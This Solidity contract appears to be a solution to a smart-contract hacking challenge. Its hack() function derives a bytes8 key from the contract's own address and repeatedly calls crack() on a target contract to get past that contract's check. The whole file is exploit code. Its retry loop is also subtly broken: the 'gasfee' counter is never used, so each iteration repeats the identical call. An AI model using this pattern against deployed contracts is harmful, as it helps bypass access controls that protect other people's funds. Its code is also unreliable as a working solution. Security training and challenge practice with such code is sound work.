//SPSPDX-License-Identifier: None
pragma solidity ^0.8.0;

contract Test {
    address public target;

    constructor(address target_) {
        target = target_;
    }

    function hack() public {
        bytes8 key;
        unchecked {
            key = bytes8(uint64(uint160(address(this))) ^ (uint64(0) - 1));
        }

        for (uint256 gasfee = 0; gasfee < 22; gasfee++) {
            (bool success, ) = target.call(
                abi.encodeWithSignature("crack(bytes8)", key)
            );

            if (success) {
                break;
            }
        }
    }
}
